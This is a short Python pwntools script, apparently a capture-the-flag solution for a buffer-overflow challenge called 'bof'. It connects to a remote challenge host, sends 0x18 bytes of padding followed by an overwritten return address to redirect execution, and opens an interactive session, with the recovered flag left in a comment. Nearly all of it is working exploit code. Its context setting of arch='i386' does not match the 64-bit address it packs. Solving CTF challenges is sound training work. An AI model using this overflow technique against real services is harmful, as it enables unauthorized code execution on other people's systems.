from pwn import*
context(os='linux',arch='i386',log_level='debug')

n=remote('isc.taiwan-te.ch', 10000)
#n=process('./bof')


n.recvuntil('\n')

n.sendline('a'*0x18+p64(0x00400607))


n.interactive()
#flag{Hello world}

